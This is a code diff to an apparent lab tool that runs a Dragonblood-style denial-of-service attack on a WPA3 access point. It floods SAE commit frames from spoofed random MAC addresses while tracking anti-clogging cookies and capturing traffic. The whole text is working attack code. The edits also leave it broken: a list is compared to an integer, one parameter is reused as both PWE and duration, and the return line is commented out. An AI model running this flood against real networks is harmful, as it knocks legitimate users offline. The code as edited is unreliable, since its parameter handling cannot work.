@@ -83,7 +83,7 @@ def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10)
     random_macs = [random_mac() for _ in range(mac_no)]
     i = 0
     
-    while time.time()- start_time < duration:
+    while time.time() - start_time < duration:
         src = random_macs[i]
         i += 1
         if i == len(random_macs):
@@ -97,35 +97,29 @@ def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10)
         
     return int(duration/60), rate, mac_no
 
-def start_dos():
+def start_dos(params):
+    if params < 4:
+        print("Invalid number of parameters for Dragonblood DoS attack.")
+        return
+    
     global pwe
     #start threading
     print("which password derivation (PWE) do you want to target: (0 or 126)")
     #pwe = int(input("PWE: "))
-    pwe = 0
-    print("Automated input: PWE = 0")    
-
+    pwe = params[0]
+    
     print("which mac do you want to target (leave empty for default AP MAC): ")
     # target = input("MAC: ")
     target = ""
-    print("Automated input: MAC = default")
+    ap_mac = utils.get_mac("TrustedAP")[0]
 
-    if target == "":
-        ap_mac = utils.get_mac("TrustedAP")[0]
-    else:
-        ap_mac = target
-
-    #set the durations
-    #duration = int(input("Duration of attack (in seconds): "))
-    #rate = float(input("enter rate of frames to transmit: "))
-    #mac_no = int(input("enter the number of spoofed frames to be used: "))
     threading.Thread(target=_track_cookie,daemon=True).start()
     time.sleep(1)
     og_interval = sys.getswitchinterval()
     sys.setswitchinterval(0.0005)
     stop_track.clear()
 
-    duration, rate, mac_no = flood_sae_commits(ap_mac)
+    duration, rate, mac_no = flood_sae_commits(ap_mac=ap_mac, duration=int(params[0]), rate=float(params[1]), mac_no=int(params[2]))
 
     sys.setswitchinterval(og_interval)
     #stop threading
@@ -136,6 +130,6 @@ def start_dos():
         pass
     tshark.communicate()
 
-    return f"sae_pwe={pwe}/dragondos_{duration}_{rate}_{mac_no}/"
+#    return f"sae_pwe={pwe}/dragondos_{duration}_{rate}_{mac_no}/"
 
 
